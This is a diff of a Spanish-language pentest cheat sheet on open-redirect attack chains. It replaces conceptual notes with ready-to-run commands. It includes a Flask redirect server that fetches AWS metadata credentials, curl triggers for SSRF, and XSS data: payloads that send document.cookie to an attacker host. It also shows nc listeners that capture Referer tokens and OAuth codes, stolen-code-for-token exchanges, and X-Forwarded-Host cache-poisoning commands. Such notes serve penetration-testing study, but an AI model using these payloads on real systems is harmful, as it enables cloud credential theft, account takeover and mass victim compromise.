@@ -26,32 +26,34 @@ linked:
 
 ## SSRF via Redirect Chain
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Server-side fetch endpoint follows redirects. App valida initial URL pero no follow chain. Atacante hostea redirect a internal IP | Bypass de SSRF whitelist. |
-| Setup atacante | Atacante hostea `https://attacker.com/r` que retorna `302 Location: http://127.0.0.1/admin` | Server follows. |
-| Bypass de IP allowlist | Initial validates `attacker.com` (allowed external) → redirect a internal | Blacklist bypass. |
-| Cloud metadata via redirect | Redirect chain → AWS metadata endpoint | Cloud creds theft. |
-| Internal port scan | Multiple redirects a distintos internal ports | Recon. |
-| 308 preserves method | POST → 308 → POST a internal | Method preservation. |
-| 302 strips body | POST → 302 → GET a internal | Body lost. |
-| Combine con DNS rebinding | Initial DNS resolve external, second internal | Race-based bypass. |
-| Time-of-check time-of-use | App validates URL, fetches later | Redirect mid-flow. |
-| URL preview / image proxy | Image proxy follows redirects → SSRF | Common vector. |
-| OG card generator | Open Graph fetcher follows redirects | Social platforms. |
-| Webhook delivery | Webhook callback follows redirects | App-to-app. |
+| Hostear redirect: `python3 -m http.server 80` con script CGI que retorna `Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS metadata via redirect | Server SSRF que sigue redirects. |
+| `curl https://target.com/api/image-proxy?url=https://attacker.com/r` | Trigger fetch que sigue redirect → AWS creds | Image proxy sin redirect deny. |
+| Hostear redirect a `http://127.0.0.1:6379/info` | Redis interno via redirect | Server con SSRF whitelist external-only. |
+| Hostear redirect 308 (preserva method) `https://attacker.com/r → 308 → http://internal/admin` | POST → POST a internal | Method-preserving redirect chain. |
+| Hostear redirect 302 (strip body) `https://attacker.com/r → 302 → http://internal/api` | GET a internal post-redirect | Standard 302. |
+| `curl https://target.com/api/url-preview?url=https://attacker.com/r` | URL preview / OG card → fetches metadata | Open Graph fetcher. |
+| `curl -X POST https://target.com/api/webhook -d '{"url":"https://attacker.com/r"}'` | Webhook delivery follows redirect | Webhook callback abuse. |
+| Setup DNS rebinding con `rebinder.io`: `7f000001.attacker.com` resuelve a `127.0.0.1` second resolve | Bypass IP whitelist via DNS race | DNS rebinding. |
 ^or-chain-ssrf
 
 ### SSRF chain workflow
 
 ```bash
-# 1. Atacante hostea redirect server
-# attacker.com/r serves:
-HTTP/1.1 302 Found
-Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# 1. Atacante hostea redirect server (Flask)
+cat <<'EOF' > redir.py
+from flask import Flask, redirect
+app = Flask(__name__)
+@app.route('/r')
+def r():
+    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)
+app.run(host='0.0.0.0', port=80)
+EOF
+python3 redir.py
 
-# 2. Atacante envía URL a target image proxy
-curl https://target.com/api/image-proxy?url=https://attacker.com/r
+# 2. Trigger SSRF en target
+curl "https://target.com/api/image-proxy?url=https://attacker.com/r"
 
 # 3. Target fetches attacker.com → follows redirect → fetches AWS metadata
 # Response contains AWS credentials → theft.
@@ -61,96 +63,74 @@ ___
 
 ## XSS via `javascript:` / `data:` URL
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | If redirect URL no validated for scheme, atacante usa `javascript:` o `data:` | Browser executes en context. |
-| `javascript:` direct | `?next=javascript:alert(document.cookie)` | XSS. |
-| `data:` HTML | `?next=data:text/html,<script>alert(1)</script>` | XSS via data URL. |
-| `data:` base64 | `?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Encoded payload. |
-| Reflected en `<a href>` | App reflejas user input en `<a href="...">` con redirect | Clickable XSS. |
-| Reflected en JS `location.href` | Client-side `location.href = userInput` | Direct DOM XSS. |
-| Reflected en meta refresh | `<meta http-equiv="refresh" content="0;url=USER_INPUT">` | Server-side. |
-| Reflected en form action | `<form action="USER_INPUT">` | Form submit XSS. |
-| Modern browsers strict | Block javascript: from Location header | Some still allow. |
-| iOS Safari edge cases | Different scheme handling | Mobile. |
-| WebView in mobile apps | Often less strict | App-specific. |
-| Combine con CSP bypass | If CSP allows `unsafe-inline` script-src | XSS chain. |
+| `curl -sI "https://target/redir?next=javascript:alert(document.cookie)"` | XSS direct via JS scheme | App pasa value a `Location:` directo. |
+| `<a href="https://target/redir?next=javascript:alert(1)">Click</a>` | Reflected as `<a href>` | Browser ejecuta on click. |
+| `curl -sI "https://target/redir?next=data:text/html,<script>fetch('//attacker?'+document.cookie)</script>"` | XSS via data URL | data: scheme aceptado. |
+| `curl -sI "https://target/redir?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="` | Base64 data URL | Filter naive sobre `<script>`. |
+| Inspect callback page: `curl -s https://target/cb?next=javascript:alert(1) \| grep -oE 'href="[^"]+"\|location\.[a-z]+\s*=\s*[^;]+'` | Identificar sink | Source review pre-attack. |
+| `curl -sI "https://target/redir?next=jAvAsCrIpT:alert(1)"` | Mixed-case scheme bypass | Filter case-sensitive. |
+| `curl -sI "https://target/redir?next=java%09script:alert(1)"` | Tab control char bypass | Strip control before validation. |
 ^or-chain-xss
 
 ___
 
 ## Token Leak via Referer
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Page con sensitive data en URL (token, session id). Open redirect → atacante recibe page como Referer | Cross-origin leak. |
-| Reset token leak | URL `/reset?token=abc` → atacante page → Referer header reveals token | ATO chain. |
-| Magic link leak | Same idea con magic links | Auth flow. |
-| OAuth code leak | Code en URL → leaked to attacker | OAuth code theft. |
-| Session ID leak | Session in URL (anti-pattern) → leaked | Direct ATO. |
-| API key in URL | `?api_key=...` leaked via Referer | API access. |
-| Filename / path leak | Sensitive paths in URL | Info disclosure. |
-| Combine con CDN logs | CDN access logs include Referer | Forensics. |
-| Referrer-Policy bypass | App relies on policy but fails to set | Default behavior leak. |
-| HTTPS→HTTP downgrade strips | Force HTTP → no Referer | Sometimes useful pattern. |
-| Combine con XSS | XSS reads document.referrer + exfil | Chain. |
+| `nc -lvnp 80` en attacker → recibir GET con Referer header del browser víctima | Captura URL con token via Referer | Víctima clickea link post-page con token en URL. |
+| `curl -sI https://target/reset?token=$T \| grep -i referrer-policy` | Verificar Referrer-Policy | Defense check. |
+| Crear página `attacker.com/welcome.html` con `<img src="//attacker/log">` → server logs Referer | Auto-leak Referer en GET | Pasive collection. |
+| Atacante phishing email con link: `https://target/redir?next=https://attacker.com/welcome.html` | Trigger redirect chain → Referer leak | Combine con OR. |
+| `<script>fetch('//attacker?ref='+document.referrer)</script>` (XSS combo) | JS-side referrer exfil | XSS chain. |
+| Inspect server access logs: `tail -f /var/log/nginx/access.log \| grep -i 'token='` | Verificar logs server captura URL con tokens | Forensic post-attack. |
 ^or-chain-referer
 
 ### Workflow token leak via Referer
 
-```
-1. Victim recibe email "Reset password" con link:
-   https://target.com/reset?token=ABC123
+```bash
+# 1. Víctima recibe link reset password
+# https://target.com/reset?token=ABC123
 
-2. Atacante hostea attacker.com con same domain pattern:
-   https://attacker.com/welcome.html
+# 2. Atacante hostea attacker.com/welcome.html con img to attacker
+# Atacante envía link secundario al víctima:
+# https://target.com/redirect?next=https://attacker.com/welcome.html
 
-3. Atacante envía secondary link:
-   https://target.com/redirect?next=https://attacker.com/welcome.html
-
-4. Victim sigue link reset → reset page open
-5. Victim clicks otro link en reset page → redirect a attacker
-6. Browser sends Referer: https://target.com/reset?token=ABC123
-7. Atacante reads Referer en server logs → tiene token
-8. Atacante usa token → reset password → ATO
+# 3. Víctima abre reset page → clickea otro link → redirect a attacker
+# 4. Browser envía: Referer: https://target.com/reset?token=ABC123
+# 5. Atacante lee server logs:
+tail -f /var/log/nginx/access.log | grep -oE 'token=[A-Za-z0-9]+'
 ```
 
 ___
 
 ## OAuth Code Stealing
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | OAuth Authorization Code flow. Code arrives via redirect_uri controllable → atacante recibe code → exchange por access token | OAuth ATO. |
-| `redirect_uri` injection | `?redirect_uri=https://attacker.com/cb` | Standard. |
-| Bypass redirect_uri whitelist | Use bypasses estándar (userinfo, encoding) | Same as Open Redirect. |
-| Subdomain takeover combo | Atacante toma dead subdomain whitelisted | Ownership transfer. |
-| Wildcard redirect_uri | If IdP allows `*.target.com` → atacante registra subdomain | Suffix bypass. |
-| Path-based whitelist bypass | `redirect_uri=https://target.com/oauth/cb/../../redirect?url=https://attacker.com` | Chain con second OR. |
-| Public client (no secret) | Code → access token sin client_secret | Public OAuth client. |
-| State parameter missing | OAuth flow without state → CSRF en authz request | Combine vector. |
-| PKCE missing | No `code_challenge` → atacante can use intercepted code | Modern OAuth. |
-| Implicit flow direct token | `response_type=token` → access_token in fragment | Direct theft. |
-| Refresh token theft | Long-lived refresh token via redirect | Persistent access. |
-| Hybrid flow | `response_type=code+id_token` + multiple vectors | Complex. |
+| `https://idp.target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker.com/cb&state=X` | Code grant interceptado por atacante | redirect_uri sin validar estricto. |
+| `?response_type=token&redirect_uri=https://attacker.com#access_token=...` | Implicit flow → access_token directo | response_type=token habilitado. |
+| `?redirect_uri=https://taken-subdomain.target.com/cb` | Subdomain takeover combo | Wildcard `*.target.com` + dangling. |
+| `?redirect_uri=https://target.com/oauth/cb/../redirect?url=https://attacker.com` | Path traversal + chain con OR interno | startsWith con path. |
+| `nc -lvnp 80` en attacker.com → recibir `?code=...` en query | Capture code | Listener post-redirect. |
+| `curl -X POST https://idp.target.com/oauth/token -d "code=$STOLEN&client_id=APP&client_secret=$LEAK&redirect_uri=https://attacker.com/cb"` | Exchange code por access_token | Public client o secret leaked. |
+| `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Acceso API como víctima | Post-token. |
 ^or-chain-oauth
 
 ___
 
 ## Cache Poisoning Combo
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Open redirect controlled by header (X-Forwarded-Host) + cacheable response | Mass victim impact. |
-| `X-Forwarded-Host` redirect poison | Cache stores Location: attacker.com en endpoint legitimo | Ver `Web Cache Poisoning`. |
-| Login redirect cache | `/login` cacheado con malicious Location | Mass phishing. |
-| Logout redirect cache | Similar | Same. |
-| Auth callback cache | OAuth callback cached → mass code theft | Auth flow combo. |
-| Combine con CDN config | Aggressive caching includes redirects | Multi-tier. |
-| Combine con HRS | Smuggle redirect injection | Multi-vector. |
-| Persistencia | TTL del cache → todos los users por TTL | Long impact. |
-| Combine con Subdomain takeover | Cache poison redirect a takeover subdomain | Trust chain. |
-| OAuth state CSRF + redirect cache | Force authz on victim → redirect cached | Multi-step. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/login` | Cache server stores Location: attacker.com | Header reflejado en redirect + unkeyed. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/api/oauth/cb?code=X` | Cache de OAuth callback con redirect malicious | Mass code theft. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=$(date +%s)` (force unique cache key) | Cache pollution probe | Cache key analysis pre-attack. |
+| Param Miner Burp → "Guess headers" en endpoint con redirect | Detecta unkeyed headers | Discovery automation. |
+| `curl -X POST -H "Host: attacker.com" https://target/login` (Host override) | Host header redirect cache poison | Host reflejado. |
+| Post-poison: `curl https://target/login` (víctima común) → recibe Location: attacker.com | Mass impact verification | TTL del cache. |
 ^or-chain-cache
 
 ***
